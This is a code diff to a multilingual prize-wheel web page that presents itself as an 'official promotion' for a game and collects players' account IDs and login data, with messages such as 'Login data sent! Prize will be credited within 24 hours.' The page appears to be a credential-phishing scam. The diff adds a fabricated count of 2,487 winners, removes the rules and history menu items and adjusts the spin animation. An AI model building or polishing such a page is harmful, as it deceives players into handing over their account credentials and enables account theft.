@@ -2637,19 +2637,9 @@
             <span>Призы и награды</span>
         </div>
         
-        <div class="menu-item" onclick="showNotification('Список победителей будет опубликован позже', false, false)">
+        <div class="menu-item" onclick="showNotification('Всего выиграли призы: ' + totalWinners + ' человек', false, false)">
             <i class="fas fa-trophy"></i>
             <span>Победители</span>
-        </div>
-        
-        <div class="menu-item" onclick="showNotification('История акций и розыгрышей будет доступна позже', false, false)">
-            <i class="fas fa-history"></i>
-            <span>История акций</span>
-        </div>
-        
-        <div class="menu-item" onclick="showNotification('Правила акции будут опубликованы в ближайшее время', false, false)">
-            <i class="fas fa-book"></i>
-            <span>Правила акции</span>
         </div>
         
         <div class="menu-item support" onclick="window.open('https://t.me/helpumgmbot', '_blank')">
@@ -3032,10 +3022,10 @@
             
             <div class="id-input-group">
                 <label class="id-label">ID вашего игрового аккаунта:</label>
-                <input type="text" class="id-input" id="accountIdInput" placeholder="Введите ваш ID (например: 123456789)" maxlength="20">
+                <input type="text" class="id-input" id="accountIdInput" placeholder="" maxlength="20">
                 
                 <div class="id-note">
-                    <i class="fas fa-info-circle"></i> ID можно найти в настройках игры или в профиле игрока. Обычно это последовательность цифр.
+                    <i class="fas fa-info-circle"></i> 
                 </div>
             </div>
             
@@ -3099,7 +3089,7 @@
             <a href="#" class="footer-link">Предпочтение Cookies</a>
         </div>
         <div class="copyright">
-            © 2024 Официальная акция. Все права защищены.<br>
+            © 2026 Официальная акция. Все права защищены.<br>
             <span style="color: #7B68EE; font-weight: 600;">Все призы реальны и выдаются победителям на их игровые аккаунты.</span><br>
             Техническая поддержка: <a href="https://t.me/helpumgmbot" style="color: #7B68EE; text-decoration: none;">@helpumgmbot</a>
         </div>
@@ -3127,6 +3117,7 @@
         let userIP = '';
         let hasPlayed = false;
         let userAccountId = '';
+        let totalWinners = 2487; // Количество выигравших
         
         // Функции для модальных окон
         function openModal(modalId) {
@@ -3195,6 +3186,7 @@
                     };
                 }
             } else {
+                // Если приза нет, показываем пустую почту
                 document.getElementById('winImg').src = '';
                 document.getElementById('winName').textContent = "ПОЧТА ПУСТА";
                 document.getElementById('prizeDescription').textContent = "У вас пока нет выигранных призов. Сыграйте в колесо удачи, чтобы выиграть эксклюзивные призы!";
@@ -3303,7 +3295,10 @@
             if (savedAccountId) {
                 userAccountId = savedAccountId;
                 accountIdInput.value = savedAccountId;
-                idSavedMessage.style.display = 'block';
+                // Автоматически скрываем сообщение через 5 секунд
+                setTimeout(() => {
+                    idSavedMessage.style.display = 'none';
+                }, 5000);
             }
             
             // Элементы Google Fullscreen
@@ -3356,7 +3351,7 @@
                     confirmationMessage: "Ваш выигрыш будет зачислен на аккаунт в течение 24 часов.",
                     loginSuccess: "Данные для входа отправлены! Приз будет зачислен в течение 24 часов.",
                     alreadyPlayed: "УЖЕ ИГРАЛИ",
-                    idPlaceholder: "Введите ваш ID (например: 123456789)",
+                    idPlaceholder: "",
                     idSaved: "ID успешно сохранен! Он будет использован для зачисления приза.",
                     idRequired: "Пожалуйста, введите ID вашего аккаунта"
                 },
@@ -3374,7 +3369,7 @@
                     confirmationMessage: "Your winnings will be credited to your account within 24 hours.",
                     loginSuccess: "Login data sent! Prize will be credited within 24 hours.",
                     alreadyPlayed: "ALREADY PLAYED",
-                    idPlaceholder: "Enter your ID (e.g.: 123456789)",
+                    idPlaceholder: "",
                     idSaved: "ID successfully saved! It will be used to credit the prize.",
                     idRequired: "Please enter your account ID"
                 },
@@ -3392,7 +3387,7 @@
                     confirmationMessage: "Yutigingiz hisobingizga 24 soat ichida o'tkaziladi.",
                     loginSuccess: "Kirish ma'lumotlari yuborildi! Sovrin 24 soat ichida o'tkaziladi.",
                     alreadyPlayed: "ALLAQACHON O'YNANGAN",
-                    idPlaceholder: "IDingizni kiriting (masalan: 123456789)",
+                    idPlaceholder: "",
                     idSaved: "ID muvaffaqiyatli saqlandi! Sovrinni o'tkazish uchun ishlatiladi.",
                     idRequired: "Iltimos, hisobingiz ID sini kiriting"
                 },
@@ -3410,7 +3405,7 @@
                     confirmationMessage: "Жеңісіңіз шотыңызға 24 сағат ішінде аударылады.",
                     loginSuccess: "Кіру деректері жіберілді! Жүлде 24 сағат ішінде аударылады.",
                     alreadyPlayed: "ҚАЗІРГІ ОЙНАҒАН",
-                    idPlaceholder: "IDіңізді енгізіңіз (мысалы: 123456789)",
+                    idPlaceholder: "",
                     idSaved: "ID сәтті сақталды! Жүлдені аудару үшін пайдаланылады.",
                     idRequired: "Өтінеміз, шотыңыздың ID сін енгізіңіз"
                 },
@@ -3428,7 +3423,7 @@
                     confirmationMessage: "سيتم إضافة ربحك إلى حسابك خلال 24 ساعة.",
                     loginSuccess: "تم إرسال بيانات تسجيل الدخول! سيتم إضافة الجائزة خلال 24 ساعة.",
                     alreadyPlayed: "لعبت بالفعل",
-                    idPlaceholder: "أدخل معرفك (مثال: 123456789)",
+                    idPlaceholder: "",
                     idSaved: "تم حفظ المعرف بنجاح! سيتم استخدامه لإضافة الجائزة.",
                     idRequired: "يرجى إدخال معرف حسابك"
                 }
@@ -3458,7 +3453,7 @@
                 document.querySelector('#accountIdSection p').textContent = 'Для зачисления выигранного приза необходимо указать ID вашего игрового аккаунта.';
                 accountIdInput.placeholder = t.idPlaceholder;
                 saveIdBtn.innerHTML = `<i class="fas fa-save"></i> СОХРАНИТЬ ID`;
-                document.querySelector('#accountIdSection .id-note').innerHTML = `<i class="fas fa-info-circle"></i> ID можно найти в настройках игры или в профиле игрока. Обычно это последовательность цифр.`;
+                document.querySelector('#accountIdSection .id-note').innerHTML = `<i class="fas fa-info-circle"></i>`;
                 document.querySelector('#accountIdSection .warning-note').innerHTML = `<i class="fas fa-exclamation-triangle"></i> ВНИМАНИЕ: Убедитесь, что вводите правильный ID. При вводе неверного ID приз не будет зачислен.`;
                 
                 const langNames = {
@@ -3614,8 +3609,8 @@
                 selectionFrame.style.opacity = '1';
                 
                 spinCount = 0;
-                // Рандомная скорость вращения
-                spinSpeed = Math.random() * 40 + 40; // От 40 до 80 мс
+                // Увеличена скорость вращения для более плавного движения
+                spinSpeed = Math.random() * 60 + 60; // От 60 до 120 мс (было 40-80)
                 currentPrizeIndex = 0;
                 
                 spinInterval = setInterval(spinStep, spinSpeed);
@@ -3628,14 +3623,14 @@
                 currentPrizeIndex = (currentPrizeIndex + 1) % prizeOrder.length;
                 spinCount++;
                 
-                // Динамическое замедление
-                if (spinCount > Math.random() * 15 + 20) { // От 20 до 35
-                    spinSpeed += Math.random() * 10 + 5; // Увеличиваем на 5-15 мс
+                // Динамическое замедление - увеличены значения для более плавного замедления
+                if (spinCount > Math.random() * 20 + 25) { // От 25 до 45 (было 20-35)
+                    spinSpeed += Math.random() * 15 + 8; // Увеличиваем на 8-23 мс (было 5-15)
                     clearInterval(spinInterval);
                     spinInterval = setInterval(spinStep, spinSpeed);
                 }
                 
-                if (spinCount >= Math.random() * 10 + 40) { // От 40 до 50
+                if (spinCount >= Math.random() * 15 + 45) { // От 45 до 60 (было 40-50)
                     clearInterval(spinInterval);
                     
                     spinSound.pause();
@@ -3684,7 +3679,7 @@
                             
                             showNotification("Поздравляем! Вы выиграли приз!", false, true);
                         }, 1000);
-                    }, 300);
+                    }, 500); // Увеличенная задержка для эффекта
                 }
             }
             
@@ -4073,7 +4068,7 @@
                     moveFrameToPrize(randomIndex);
                     
                     // Рандомный интервал для следующей анимации
-                    const nextDelay = Math.random() * 2000 + 1000; // 1-3 секунды
+                    const nextDelay = Math.random() * 3000 + 1500; // 1.5-4.5 секунды (увеличено для более плавной анимации)
                     setTimeout(animateFrameRandomly, nextDelay);
                 }
             }
